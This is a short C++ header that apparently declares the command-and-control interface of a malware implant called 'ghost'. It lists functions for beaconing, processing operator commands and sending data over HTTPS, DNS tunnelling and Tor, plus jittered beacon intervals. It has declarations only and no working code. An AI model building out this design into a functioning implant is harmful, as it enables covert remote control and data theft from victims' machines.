#pragma once

#include <cstdint>
#include <cstddef>
#include <vector>
#include <string>

namespace ghost {
namespace c2 {

bool Initialize();

bool Beacon(const uint8_t* data, size_t len);

void ProcessCommand(const uint8_t* data, size_t len);

bool SendHTTPS(const uint8_t* data, size_t len);
bool SendDNSTunnel(const uint8_t* data, size_t len);
bool SendTOR(const uint8_t* data, size_t len);

extern uint32_t g_BeaconIntervalMin;
extern uint32_t g_BeaconIntervalMax;

} 
}